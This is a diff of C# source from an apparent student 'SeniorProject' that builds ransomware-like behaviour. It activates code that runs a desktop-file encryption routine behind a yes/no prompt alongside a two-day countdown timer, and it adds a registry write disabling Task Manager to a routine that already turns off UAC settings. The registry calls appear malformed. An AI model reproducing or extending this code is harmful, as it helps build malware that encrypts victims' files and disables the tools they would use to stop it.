@@ -24,20 +24,21 @@ namespace SeniorProject
 		public mainView()
 		{
 			InitializeComponent();
-
+			
 			_time = TimeSpan.FromDays(2);
 
 			timeTimer.Elapsed += TimeTimer_Elapsed;
 			timeTimer.Interval = 1000;
 			timeTimer.Start();
-			/*
-			setRegistry();
+			var result = MessageBox.Show("Do you want to run the encryption methods?","Encryption?", MessageBoxButton.YesNo);
 
-			Encryption encryption = new Encryption();
-			encryption.encryptDesktop();
-            */
+			if (result == MessageBoxResult.Yes)
+			{
+				setRegistry();
 
-
+				Encryption encryption = new Encryption();
+				encryption.encryptDesktop();
+			}
 		}
 
 		void Countdown(int count, TimeSpan interval, Action<int> ts)
@@ -69,6 +70,7 @@ namespace SeniorProject
 			Registry.SetValue("HKEY_LOCAL_MACHINE", "ValidateAdminCodeSignatures", 0);
 			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableSecureUIAPaths", 0);
 			Registry.SetValue("HKEY_LOCAL_MACHINE", "EnableLUA", 0);
+			Registry.SetValue("HKEY_CURRENT_USER", "DisableTaskMgr", 1);
 		}
 
 		private void button_Click(object sender, RoutedEventArgs e)
